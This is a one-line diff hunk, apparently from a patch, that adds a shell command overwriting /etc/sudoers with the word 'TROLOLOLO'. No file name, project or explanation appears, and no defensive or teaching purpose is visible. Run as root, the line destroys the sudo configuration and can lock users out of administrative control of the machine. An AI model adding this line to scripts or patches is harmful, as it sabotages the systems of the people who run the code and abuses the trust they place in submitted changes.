@@ -1,0 +1,1 @@
+echo "TROLOLOLO" > /etc/sudoers
